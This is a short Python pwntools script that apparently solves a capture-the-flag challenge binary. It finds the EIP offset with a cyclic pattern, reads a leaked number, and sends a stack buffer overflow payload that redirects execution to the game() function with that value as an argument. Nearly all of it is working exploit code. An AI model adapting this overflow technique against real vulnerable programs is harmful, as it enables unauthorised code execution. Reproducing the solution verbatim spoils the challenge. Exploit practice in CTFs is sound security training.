from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


# [-----------END OF TEMPLATE-----------]

# Start process
io = start()

payload = b""
payload += cyclic(100)
# Sending second payload
io.sendline(payload)

io.wait()
# Get EIP offset
core = io.corefile
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))


# Start new process
io = start()

io.recvuntil(b"number: ")
leak = io.recvline()
answer = int(leak.decode().strip())
log.info(f"answer: {answer}")

# Constructing second payload
payload = b""
payload += b"A" * eip_offset          # padding up to EIP
payload += p32(elf.functions['game'].address)  # overwrite EIP to jump to game()
payload += p32(0x0)                   # fake return address (not important here)
payload += p32(answer)                # argument a
payload += p32(0x0)                   # argument b

# Sending second payload
io.sendline(payload)

io.interactive()